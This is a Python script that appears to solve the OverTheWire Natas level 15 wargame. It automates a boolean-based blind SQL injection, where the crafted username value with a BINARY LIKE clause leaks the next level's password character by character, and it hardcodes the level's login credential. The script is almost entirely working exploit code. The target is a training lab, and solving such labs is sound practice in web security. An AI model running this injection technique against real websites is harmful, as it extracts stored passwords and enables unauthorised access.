#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

characters = ascii_lowercase + ascii_uppercase + digits
print(characters)

username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
seen_password = []

while True:
    for ch in characters:
        attempt = "".join(seen_password) + ch
        print(f"Trying with password: {attempt}")
        try:
            response = session.post(
                url,
                data={"username": f'natas16" AND BINARY password LIKE "{attempt}%" #'},
                auth=(username, password),
                timeout=10
            )
            if 'user exists' in response.text:
                seen_password.append(ch)
                print(f"[+] Found so far: {''.join(seen_password)}")
                break
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            time.sleep(1)
            continue

        time.sleep(0.1)

    if len(seen_password) == 32:
        print(f"[✓] Password found: {''.join(seen_password)}")
        break